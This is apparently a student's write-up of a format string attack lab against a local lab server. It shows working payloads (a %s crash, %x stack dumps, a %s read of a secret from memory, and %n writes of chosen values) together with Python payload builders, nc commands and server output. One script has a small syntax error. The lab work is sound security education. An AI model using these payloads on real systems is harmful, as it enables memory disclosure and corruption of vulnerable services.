# Format String Attack Lab

## Task 1: Crashing the Program

Crashing the program will be a very simple task. Since we have control over the
format string parameter of printf, we can pass to it "%s", which tries to read
from the address on top of the stack, and since it is very likely that this
address is not a valid one, the program will seg fault.

```sh
$ nc 10.9.0.5 9090
%s
^C
```

Server output:

```text
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffab1800
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 3 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffab1728
server-10.9.0.5 | The target variable's value (before): 0x11223344
```

There is no Returned Properly message, so we conclude that we successfully
crashed the program.

## Task 2: Printing Out the Server Program’s Memory

### Task 2.A: Stack Data

By consulting the manual pages for printf, we see that the "%x" format
specifier prints in hexadecimal the value at the top of the stack. We also know
that our format string itself is stored on the stack, so if we "dig up" the
stack enough with "%x", we will eventually find our string. We will use python
to generate the string for us.

```sh
$ python3 -c "print('AAAA' + '%x.'*100)" | nc 10.9.0.5 9090
^C
```

Server output:

```text
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffa39fc0
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 305 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffa39ee8
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | AAAA11223344.1000.8049db5.80e5320.80e61c0.ffa39fc0.ffa39ee8.80e62d4.80e5000.ffa39f88.8049f7e.ffa39fc0.0.64.8049f47.80e5320.4ab.ffa3a0f1.ffa39fc0.80e5320.9896720.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.bc1d2300.80e5000.80e5000.ffa3a5a8.8049eff.ffa39fc0.131.5dc.80e5320.0.0.0.ffa3a674.0.0.0.131.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

If we count it up, we see that our "41414141" appears after 64 "%x". We can
also access it directly with "%64\$x

### Task 2.B: Heap Data

This task will be very similar to the last one, but instead if placing 'AAAA'
at the start of our payload, we will place the address we want to read (which
by looking at the server logs we determine it to be 0x080b4008) and replace the
last "%x" with a "%s", which reads a string from the address until a null byte
is found.

```python
$ cat build_string.py
#!/usr/bin/python3
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x080b4008
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%x"*63 + "%s"
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

with open('badfile', 'wb') as f:
  f.write(content)
```

```sh
$ ./build_string.py && cat badfile | nc 10.9.0.5 9090
server-10.9.0.5 |@
                1122334410008049db580e532080e61c0fff21230fff2115880e62d480e5000fff211f88049f7efff212300648049f4780e53205dc5dcfff21230fff212309af4720000000000000000000000000080f99f0080e500080e5000fff218188049efffff212305dc5dc80e5320000fff218e40005dcA secret message
```

As we can see, the string stored at this address is "A secret message".

### Task 3.A: Change the value to a different value

In this task, we are asked to write anything to an arbitrary address. To do
this, in similarity to previous tasks, we put the address we want to write to
at the start of the payload, followed by, in this case, 63 "%x" and lastly,
instead of "%s" like we used in the last task, we use "%n", which according to
the manual writes the number of bytes printed so far to the address at the top
of the stack. Our script will look like this:

```python
$ cat build_string.py
#!/usr/bin/python3
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%x"*63 + "%n"
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

with open('badfile', 'wb') as f:
  f.write(content)
```

```sh
$ ./build_string.py && cat badfile | nc 10.9.0.5 9090
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | The target variable's value (after): 0x000000ec
```

We have successfully written to target the number 0xec, which corresponds to
the number in hexadecimal of the bytes printed out by the printf function.

### Task 3.B: Change the value to 0x5000

This task is very similar to the last one, but instead of printing out 0xec
bytes before our "%n", we have to write 0x5000 bytes. printf offers a very
convenient way of doing this in the form of padding: we can add padding to our
last "%x" to inflate the number of bytes written. This padding will be equal to
0x5000 - 0xec.

```python
$ cat build_string.py
#!/usr/bin/python3
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%x"*62 + "%" + str(0x5000 - 0xec) + "x" + "%n"
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

with open('badfile', 'wb') as f:
  f.write(content
```

```sh
$ ./build_string.py && cat badfile | nc 10.9.0.5 9090
server-10.9.0.5 | The target variable's value (after): 0x00004ffd
```

Hmm wierd, we are 3 bytes off. No problem, we'll just change our padding to add
3 more bytes.

```python
s = "%x"*62 + "%" + str(0x5000 - 0xec + 0x3) + "x" + "%n"
```

```sh
$ ./build_string.py && cat badfile | nc 10.9.0.5 9090
server-10.9.0.5 | The target variable's value (after): 0x00005000
```
